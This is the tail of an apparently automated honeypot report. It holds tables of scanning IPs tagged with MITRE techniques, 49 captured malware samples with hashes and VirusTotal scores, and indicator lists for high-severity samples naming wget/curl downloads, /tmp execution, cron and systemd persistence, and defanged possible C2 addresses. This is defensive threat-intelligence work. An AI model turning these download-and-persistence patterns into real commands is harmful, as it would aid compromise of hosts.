| `185.89.156[.]101` | **3** | 2026-10-09 11:42 | 2026-10-09 14:41 | 1m | 0 | `T1592` | 🟢 LOW |
| `37.114.229[.]73` | **3** | 2026-10-09 03:58 | 2026-10-09 06:57 | 1m | 0 | `T1592` | 🟢 LOW |
| `120.48.90[.]166` | **2** | 2026-10-09 05:54 | 2026-10-09 06:12 | 4m | 0 | `T1592` | 🟢 LOW |
| `125.134.42[.]214` | **2** | 2026-10-09 14:40 | 2026-10-09 16:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | **2** | 2026-10-09 06:43 | 2026-10-09 08:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-10-09 03:29 | 2026-10-09 04:09 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-09 03:07 | 2026-10-09 04:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-09 06:17 | 2026-10-09 08:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `37.114.229[.]73` | **2** | 2026-10-09 08:57 | 2026-10-09 10:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `37.114.229[.]73` | **2** | 2026-10-09 13:57 | 2026-10-09 14:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | **2** | 2026-10-09 05:36 | 2026-10-09 06:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.66.165[.]103` | 1 | 2026-10-09 04:15 | 2026-10-09 04:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.83.87[.]185` | 1 | 2026-10-09 04:43 | 2026-10-09 04:43 | 15s | 0 | `T1592` | 🟢 LOW |
| `106.12.7[.]70` | 1 | 2026-10-09 08:22 | 2026-10-09 08:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.48[.]117` | 1 | 2026-10-09 13:58 | 2026-10-09 14:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.75.254[.]120` | 1 | 2026-10-09 13:32 | 2026-10-09 13:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]103` | 1 | 2026-10-09 06:48 | 2026-10-09 06:48 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]111` | 1 | 2026-10-09 11:32 | 2026-10-09 11:32 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]147` | 1 | 2026-10-09 14:28 | 2026-10-09 14:28 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]41` | 1 | 2026-10-09 04:45 | 2026-10-09 04:45 | 8s | 0 | `T1592` | 🟢 LOW |
| `115.190.120[.]86` | 1 | 2026-10-09 05:14 | 2026-10-09 05:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.197[.]138` | 1 | 2026-10-09 13:56 | 2026-10-09 13:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.228.233[.]93` | 1 | 2026-10-09 08:18 | 2026-10-09 08:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.34.125[.]173` | 1 | 2026-10-09 04:10 | 2026-10-09 04:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.161.116[.]2` | 1 | 2026-10-09 05:38 | 2026-10-09 05:38 | 23s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-09 03:42 | 2026-10-09 03:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-09 14:19 | 2026-10-09 14:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]32` | 1 | 2026-10-09 10:06 | 2026-10-09 10:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-09 06:25 | 2026-10-09 06:25 | 4s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-09 08:44 | 2026-10-09 08:44 | 3s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-09 11:19 | 2026-10-09 11:20 | 57s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-09 16:32 | 2026-10-09 16:33 | 42s | 0 | `T1592` | 🟢 LOW |
| `135.119.91[.]133` | 1 | 2026-10-09 15:28 | 2026-10-09 15:28 | 9s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-09 08:54 | 2026-10-09 08:55 | 52s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-09 10:02 | 2026-10-09 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-09 12:02 | 2026-10-09 12:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-09 14:06 | 2026-10-09 14:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-09 16:11 | 2026-10-09 16:11 | 2s | 0 | `T1592` | 🟢 LOW |
| `14.29.181[.]34` | 1 | 2026-10-09 04:09 | 2026-10-09 04:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.54.188[.]126` | 1 | 2026-10-09 15:45 | 2026-10-09 15:45 | 27s | 0 | `T1592` | 🟢 LOW |
| `14.57.184[.]75` | 1 | 2026-10-09 16:31 | 2026-10-09 16:31 | 23s | 0 | `T1592` | 🟢 LOW |
| `148.222.223[.]107` | 1 | 2026-10-09 05:19 | 2026-10-09 05:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `155.103.71[.]188` | 1 | 2026-10-09 04:19 | 2026-10-09 04:20 | 15s | 0 | `T1592` | 🟢 LOW |
| `155.103.71[.]239` | 1 | 2026-10-09 04:02 | 2026-10-09 04:03 | 15s | 0 | `T1592` | 🟢 LOW |
| `156.229.16[.]142` | 1 | 2026-10-09 04:55 | 2026-10-09 04:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.206.224[.]51` | 1 | 2026-10-09 04:40 | 2026-10-09 04:41 | 10s | 0 | `T1592` | 🟢 LOW |
| `172.235.41[.]44` | 1 | 2026-10-09 07:38 | 2026-10-09 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]220` | 1 | 2026-10-09 14:38 | 2026-10-09 14:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `174.138.49[.]97` | 1 | 2026-10-09 06:07 | 2026-10-09 06:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.203.243[.]177` | 1 | 2026-10-09 10:27 | 2026-10-09 10:27 | 22s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-09 13:56 | 2026-10-09 13:56 | 15s | 0 | `T1592` | 🟢 LOW |
| `179.43.150[.]26` | 1 | 2026-10-09 05:13 | 2026-10-09 05:13 | 1s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-10-09 05:26 | 2026-10-09 05:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-10-09 15:09 | 2026-10-09 15:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.89.156[.]101` | 1 | 2026-10-09 08:43 | 2026-10-09 08:43 | 23s | 0 | `T1592` | 🟢 LOW |
| `190.232.93[.]49` | 1 | 2026-10-09 14:11 | 2026-10-09 14:12 | 41s | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]220` | 1 | 2026-10-09 13:08 | 2026-10-09 13:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.106.64[.]21` | 1 | 2026-10-09 08:09 | 2026-10-09 08:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.107.114[.]117` | 1 | 2026-10-09 10:40 | 2026-10-09 10:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-09 14:04 | 2026-10-09 14:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-10-09 08:39 | 2026-10-09 08:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-10-09 14:46 | 2026-10-09 14:46 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]228` | 1 | 2026-10-09 03:00 | 2026-10-09 03:00 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `198.179.70[.]19` | 1 | 2026-10-09 08:17 | 2026-10-09 08:17 | 10s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]57` | 1 | 2026-10-09 06:37 | 2026-10-09 06:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.180.32[.]104` | 1 | 2026-10-09 05:50 | 2026-10-09 05:50 | 11s | 0 | `T1592` | 🟢 LOW |
| `20.65.178[.]152` | 1 | 2026-10-09 14:25 | 2026-10-09 14:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.113[.]18` | 1 | 2026-10-09 11:20 | 2026-10-09 11:21 | 11s | 0 | `T1592` | 🟢 LOW |
| `200.59.88[.]124` | 1 | 2026-10-09 08:16 | 2026-10-09 08:16 | 11s | 0 | `T1592` | 🟢 LOW |
| `200.81.170[.]119` | 1 | 2026-10-09 07:55 | 2026-10-09 07:55 | 10s | 0 | `T1592` | 🟢 LOW |
| `203.25.108[.]75` | 1 | 2026-10-09 11:50 | 2026-10-09 11:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `209.99.190[.]110` | 1 | 2026-10-09 08:39 | 2026-10-09 08:39 | 0s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `209.99.190[.]110` | 1 | 2026-10-09 16:13 | 2026-10-09 16:13 | 0s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.226.39[.]4` | 1 | 2026-10-09 12:02 | 2026-10-09 12:02 | 17s | 0 | `T1592` | 🟢 LOW |
| `211.227.162[.]164` | 1 | 2026-10-09 14:09 | 2026-10-09 14:09 | 22s | 0 | `T1592` | 🟢 LOW |
| `211.251.11[.]198` | 1 | 2026-10-09 08:27 | 2026-10-09 08:27 | 21s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]80` | 1 | 2026-10-09 12:43 | 2026-10-09 12:43 | 10s | 0 | `T1592` | 🟢 LOW |
| `216.218.219[.]164` | 1 | 2026-10-09 11:12 | 2026-10-09 11:12 | 10s | 0 | `T1592` | 🟢 LOW |
| `218.190.230[.]250` | 1 | 2026-10-09 14:34 | 2026-10-09 14:34 | 20s | 0 | `T1592` | 🟢 LOW |
| `218.23.192[.]91` | 1 | 2026-10-09 04:10 | 2026-10-09 04:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.78.21[.]134` | 1 | 2026-10-09 03:02 | 2026-10-09 03:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `219.79.4[.]2` | 1 | 2026-10-09 08:53 | 2026-10-09 08:54 | 30s | 0 | `T1592` | 🟢 LOW |
| `221.144.221[.]177` | 1 | 2026-10-09 09:43 | 2026-10-09 09:43 | 20s | 0 | `T1592` | 🟢 LOW |
| `222.98.105[.]108` | 1 | 2026-10-09 06:44 | 2026-10-09 06:45 | 22s | 0 | `T1592` | 🟢 LOW |
| `31.146.64[.]60` | 1 | 2026-10-09 11:13 | 2026-10-09 11:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.40.204[.]130` | 1 | 2026-10-09 15:51 | 2026-10-09 15:51 | 15s | 0 | `T1592` | 🟢 LOW |
| `34.156.151[.]177` | 1 | 2026-10-09 03:17 | 2026-10-09 03:17 | 1s | 0 | `T1592` | 🟢 LOW |
| `34.156.160[.]247` | 1 | 2026-10-09 05:18 | 2026-10-09 05:18 | 6s | 0 | `T1592` | 🟢 LOW |
| `36.136.66[.]44` | 1 | 2026-10-09 06:37 | 2026-10-09 06:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.202.135[.]92` | 1 | 2026-10-09 12:58 | 2026-10-09 12:59 | 20s | 0 | `T1592` | 🟢 LOW |
| `37.202.135[.]92` | 1 | 2026-10-09 15:59 | 2026-10-09 15:59 | 27s | 0 | `T1592` | 🟢 LOW |
| `42.51.49[.]166` | 1 | 2026-10-09 05:50 | 2026-10-09 05:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-09 13:07 | 2026-10-09 13:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-09 16:05 | 2026-10-09 16:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-10-09 04:07 | 2026-10-09 04:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-10-09 13:34 | 2026-10-09 13:34 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-10-09 15:33 | 2026-10-09 15:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-10-09 12:33 | 2026-10-09 12:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-10-09 14:38 | 2026-10-09 14:38 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]223` | 1 | 2026-10-09 06:47 | 2026-10-09 06:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]251` | 1 | 2026-10-09 15:34 | 2026-10-09 15:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-10-09 03:46 | 2026-10-09 03:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-10-09 08:38 | 2026-10-09 08:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-10-09 07:37 | 2026-10-09 07:37 | 5s | 0 | `T1592` | 🟢 LOW |
| `59.29.125[.]69` | 1 | 2026-10-09 12:55 | 2026-10-09 12:55 | 29s | 0 | `T1592` | 🟢 LOW |
| `62.195.180[.]169` | 1 | 2026-10-09 12:05 | 2026-10-09 12:06 | 27s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-10-09 07:06 | 2026-10-09 07:06 | 1s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]5` | 1 | 2026-10-09 04:56 | 2026-10-09 04:56 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-10-09 13:19 | 2026-10-09 13:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]142` | 1 | 2026-10-09 11:42 | 2026-10-09 11:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]22` | 1 | 2026-10-09 15:01 | 2026-10-09 15:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]129` | 1 | 2026-10-09 05:03 | 2026-10-09 05:03 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]90` | 1 | 2026-10-09 13:39 | 2026-10-09 13:39 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-09 14:37 | 2026-10-09 14:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-10-09 13:35 | 2026-10-09 13:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `71.6.135[.]131` | 1 | 2026-10-09 10:05 | 2026-10-09 10:05 | 33s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-09 05:09 | 2026-10-09 05:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-09 14:05 | 2026-10-09 14:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.121.183[.]62` | 1 | 2026-10-09 15:04 | 2026-10-09 15:04 | 14s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]10` | 1 | 2026-10-09 14:01 | 2026-10-09 14:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]9` | 1 | 2026-10-09 14:05 | 2026-10-09 14:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]114` | 1 | 2026-10-09 14:29 | 2026-10-09 14:29 | 2s | 0 | `T1592` | 🟢 LOW |
| `88.70.0[.]210` | 1 | 2026-10-09 05:50 | 2026-10-09 05:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.229.234[.]76` | 1 | 2026-10-09 15:10 | 2026-10-09 15:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-10-09 14:56 | 2026-10-09 14:57 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-09 08:20 | 2026-10-09 08:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-09 10:28 | 2026-10-09 10:28 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

